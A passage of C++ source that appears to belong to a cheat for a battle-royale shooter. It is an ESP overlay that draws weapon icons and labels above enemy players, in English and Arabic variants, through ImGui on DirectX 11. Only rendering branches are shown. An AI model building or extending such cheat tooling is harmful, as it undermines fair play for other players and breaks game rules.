														DX11::ImGui_DX11::DrawImage(DX11::Hand12, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "S686")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand16, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "M1014")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand56, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "S12K")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand11, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "DP12")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand38, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "Shoulei Grenade")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand19, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "Smoke Grenade")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand20, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "Burn Grenade")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand21, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "CrossBow")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand37, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "AMR")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand35, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "Dagger")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand58, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "Zombie Blade")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand59, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "Zombie Hammer")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand60, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
												}
												else if (Setting::EspStyle == 1 || Setting::EspStyle == 2 || Setting::EspStyle == 3)
												{
													string wep = AActor.Weapon;
													if (wep == "Fist")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand22, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "AKM")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand24, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "ACE32")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand39, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "AUG")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand28, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "M24")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand7, Screen.X - 35, Screen.Y - 55, 80, 15);
														continue;
													}
													else if (wep == "Kar98k")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand1, Screen.X - 35, Screen.Y - 55, 80, 15);
														continue;
													}
													else if (wep == "AWM")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand23, Screen.X - 35, Screen.Y - 55, 80, 15);
														continue;
													}
													else if (wep == "Mosin")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand55, Screen.X - 35, Screen.Y - 55, 80, 15);
														continue;
													}
													else if (wep == "M762")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand15, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "FAMAS")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand57, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "M416")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand2, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "Honey Badger")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand42, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "P18C" || wep == "Vz61" || wep == "R1895")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand32, Screen.X, Screen.Y - 55, 30, 20);
														continue;
													}
													else if (wep == "Flaregun")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand46, Screen.X, Screen.Y - 55, 30, 20);
														continue;
													}
													else if (wep == "P1911")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand48, Screen.X, Screen.Y - 55, 30, 20);
														continue;
													}
													else if (wep == "R45")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand45, Screen.X, Screen.Y - 55, 30, 20);
														continue;
													}
													else if (wep == "P92")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand50, Screen.X, Screen.Y - 55, 30, 20);
														continue;
													}
													else if (wep == "DesertEagle")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand44, Screen.X, Screen.Y - 55, 30, 20);
														continue;
													}
													else if (wep == "QBU")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand26, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "SLR")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand14, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "SKS")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand13, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "Mini14")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand27, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "Mk14")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand4, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "VSS")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand17, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "Win94")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand33, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "MK12")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand49, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "SCAR-L")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand6, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "M16A4")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand3, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "Mk47")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand10, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "G36")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand29, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "QBZ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand8, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "Groza")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand5, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "DP28")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand9, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "M249")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand25, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "MG3")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand43, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "P90")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand54, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "UMP9")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand18, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "PP19")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand30, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "Uzi")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand31, Screen.X - 35, Screen.Y - 55, 35, 20);
														continue;
													}
													else if (wep == "TommyGun")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand34, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "Vector")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand35, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "MP5K")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand51, Screen.X - 35, Screen.Y - 55, 50, 20);
														continue;
													}
													else if (wep == "SawedOff")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand36, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "S1897")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand12, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "S686")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand16, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "M1014")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand56, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "S12K")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand11, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "DP12")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand38, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "Shoulei Grenade")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand19, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "Smoke Grenade")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand20, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "Burn Grenade")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand21, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "CrossBow")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand37, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "AMR")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand35, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "Dagger")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand58, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "Zombie Blade")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand59, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "Zombie Hammer")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand60, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
												}
											}
										}
										else if (Setting::Lang == 1)
										{
											if (WeaponStyle == 0)
											{
												if (Setting::EspStyle == 0)
												{
													auto scope = "  " + AActor.ScopeFov;
													if (AActor.Weapon == "ﺪﻴﻟﺍ")
													{
														Text = AActor.Weapon;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X + 2, Screen.Y - 20, DX11::ImGui_DX11::Color::Green, true);
													}
													else
													{
														Text = AActor.Weapon + scope;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X + 2, Screen.Y - 20, ImColor(Setting::weaponenemycolor[0], Setting::weaponenemycolor[1], Setting::weaponenemycolor[2], Setting::weaponenemycolor[3]), true);
													}
												}
												else if (Setting::EspStyle == 1)
												{
													auto scope = "  " + AActor.ScopeFov;
													if (AActor.Weapon == "ﺪﻴﻟﺍ")
													{
														Text = AActor.Weapon;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X + 2, Screen.Y - 45, DX11::ImGui_DX11::Color::Green, true);
													}
													else
													{
														Text = AActor.Weapon + scope;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X + 2, Screen.Y - 45, ImColor(Setting::weaponenemycolor[0], Setting::weaponenemycolor[1], Setting::weaponenemycolor[2], Setting::weaponenemycolor[3]), true);
													}
												}
												else if (Setting::EspStyle == 2)
												{
													auto scope = "  " + AActor.ScopeFov;
													if (AActor.Weapon == "ﺪﻴﻟﺍ")
													{
														Text = AActor.Weapon;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X + 4, Screen.Y - 45, DX11::ImGui_DX11::Color::Green, true);
													}
													else
													{
														Text = AActor.Weapon + scope;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X + 4, Screen.Y - 45, ImColor(Setting::weaponenemycolor[0], Setting::weaponenemycolor[1], Setting::weaponenemycolor[2], Setting::weaponenemycolor[3]), true);
													}
												}
												else if (Setting::EspStyle == 3)
												{
													auto scope = "  " + AActor.ScopeFov;
													if (AActor.Weapon == "ﺪﻴﻟﺍ")
													{
														Text = AActor.Weapon;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X + 4, Screen.Y - 45, DX11::ImGui_DX11::Color::Green, true);
													}
													else
													{
														Text = AActor.Weapon + scope;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X + 4, Screen.Y - 45, ImColor(Setting::weaponenemycolor[0], Setting::weaponenemycolor[1], Setting::weaponenemycolor[2], Setting::weaponenemycolor[3]), true);
													}
												}
											}
											else if (WeaponStyle == 1)
											{
												if (Setting::EspStyle == 0)
												{
													string wep = AActor.Weapon;
													if (wep == "ﺪﻴﻟﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand22, Screen.X - 30, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ﻡﺍ ﻲﻛ ﻱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand24, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "23 ﺲﻳﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand39, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ﻲﺟ ﻮﻳ ﻱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand28, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ﻲﺳ ﻲﻛ ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand7, Screen.X - 35, Screen.Y - 35, 80, 15);
														continue;
													}
													else if (wep == "ﻲﻛ 89 ﺭﺎﻛ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand1, Screen.X - 35, Screen.Y - 35, 80, 15);
														continue;
													}
													else if (wep == "ﻡﻭﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand23, Screen.X - 35, Screen.Y - 35, 80, 15);
														continue;
													}
													else if (wep == "ﻦﻴﺳﻮﻣ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand55, Screen.X - 35, Screen.Y - 35, 80, 15);
														continue;
													}
													else if (wep == "ﻦﻔﺳ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand15, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ﺱﺎﻣﺎﻓ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand57, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ﺭﻮﻓ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand2, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ﺮﺟﺪﺑ ﻲﻧﺎﻫ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand42, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ﻲﺳ 81 ﻲﺑ" || wep == "16 ﺩﺯ ﻲﻓ" || wep == "5981 ﺭﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand32, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == "ﻦﺟ ﺮﻴﻠﻓ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand46, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == "1191 ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand48, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == "54 ﺭﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand45, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == "29 ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand50, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == "ﻞﺠﻳﺍ ﺕﺮﻳﺰﻳﺩ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand44, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == "ﻮﻳ ﻲﺑ ﻮﻴﻛ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand26, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "ﺭﺍ ﻝﺍ ﺱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand14, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "ﺱﺍ ﻲﻛ ﺱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand13, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "41 ﻲﻨﻴﻣ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand27, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "41 ﻲﻛ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand4, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "ﺱﺍ ﺱﺍ ﻲﻓ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand17, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "49 ﻦﻳﻭ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand33, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "21 ﻲﻛ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand49, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "ﻝﺍ ﺭﺎﻜﺳﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand6, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "61 ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand3, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "74 ﻲﻛ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand10, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ﻲﺳ 63 ﻲﺟ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand29, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ﺩﺯ ﻲﺑ ﻮﻴﻛ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand8, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ﺍﺯﻭﺮﺟ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand5, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "82 ﻲﺑ ﻱﺩ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand9, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ﻲﺳ ﻲﻛ ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand25, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "3 ﻲﺟ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand43, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "09 ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand54, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ﻲﺑ ﻡﺍ ﻮﻳ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand18, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "91 ﻲﺑ ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand30, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ﻱﺯﻭﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand31, Screen.X - 35, Screen.Y - 35, 35, 20);
														continue;
													}
													else if (wep == "ﻦﺟ ﻲﻣﻮﺗ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand34, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ﺭﻮﺘﻜﻴﻓ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand35, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ﻲﻛ 5 ﻲﺑ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand51, Screen.X - 35, Screen.Y - 35, 50, 20);
														continue;
													}
													else if (wep == "ﻑﻭﺍ ﺩﺍﻮﺳ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand36, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "7981 ﺱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand12, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "686 ﺱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand16, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "4101 ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand56, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ﻲﻛ 21 ﺱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand11, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "21 ﻲﺑ ﻱﺩ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand38, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ﺔﻠﺒﻨﻗ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand19, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ﻙﻮﻤﺳ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand20, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ﻑﻮﺗﻮﻟﻮﻣ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand21, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ﻮﺒﺳﻭﺮﻛ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand37, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "ﺭﺍ ﻡﺍ ﻱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand35, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "Dagger")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand58, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "Zombie Blade")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand59, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "Zombie Hammer")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand60, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
												}
												else if (Setting::EspStyle == 1 || Setting::EspStyle == 2 || Setting::EspStyle == 3)
												{
													string wep = AActor.Weapon;
													if (wep == "ﺪﻴﻟﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand22, Screen.X - 30, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ﻡﺍ ﻲﻛ ﻱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand24, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "23 ﺲﻳﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand39, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "ﻲﺟ ﻮﻳ ﻱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand28, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "ﻲﺳ ﻲﻛ ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand7, Screen.X - 30, Screen.Y - 55, 80, 15);
														continue;
													}
													else if (wep == "ﻲﻛ 89 ﺭﺎﻛ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand1, Screen.X - 30, Screen.Y - 55, 80, 15);
														continue;
													}
													else if (wep == "ﻡﻭﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand23, Screen.X - 30, Screen.Y - 55, 80, 15);
														continue;
													}
													else if (wep == "ﻦﻴﺳﻮﻣ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand55, Screen.X - 30, Screen.Y - 55, 80, 15);
														continue;
													}
													else if (wep == "ﻦﻔﺳ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand15, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "ﺱﺎﻣﺎﻓ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand57, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "ﺭﻮﻓ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand2, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "ﺮﺟﺪﺑ ﻲﻧﺎﻫ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand42, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "ﻲﺳ 81 ﻲﺑ" || wep == "16 ﺩﺯ ﻲﻓ" || wep == "5981 ﺭﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand32, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == "ﻦﺟ ﺮﻴﻠﻓ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand46, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == "1191 ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand48, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == "54 ﺭﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand45, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == "29 ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand50, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == "ﻞﺠﻳﺍ ﺕﺮﻳﺰﻳﺩ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand44, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == "ﻮﻳ ﻲﺑ ﻮﻴﻛ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand26, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "ﺭﺍ ﻝﺍ ﺱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand14, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "ﺱﺍ ﻲﻛ ﺱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand13, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "41 ﻲﻨﻴﻣ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand27, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "41 ﻲﻛ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand4, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "ﺱﺍ ﺱﺍ ﻲﻓ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand17, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "49 ﻦﻳﻭ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand33, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "21 ﻲﻛ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand49, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "ﻝﺍ ﺭﺎﻜﺳﺍ")
													{
